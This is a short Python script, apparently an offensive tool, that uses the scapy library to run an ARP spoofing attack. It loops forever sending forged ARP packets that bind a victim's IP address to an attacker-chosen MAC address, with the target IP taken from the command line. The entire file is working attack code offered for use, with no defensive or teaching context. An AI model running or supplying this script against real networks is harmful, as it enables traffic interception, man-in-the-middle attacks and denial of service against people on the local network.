import time
import sys
from scapy.all import *


class ARRAttacker:
    '''
    Use attack's MAC to replace the victim's MAC
    '''

    def __init__(self, ip, mac):
        self.ip = ip
        self.mac = mac

    def attack(self, victim_ip):
        arp = ARP(op=1, psrc=victim_ip, pdst=victim_ip, hwsrc=self.mac)
        while True:
            send(arp)
            time.sleep(1)


if __name__ == "__main__":
    target = sys.argv[1]
    attacker = ARRAttacker('127.0.0.1', '67:ff:52:91:87:21')
    attacker.attack(target)
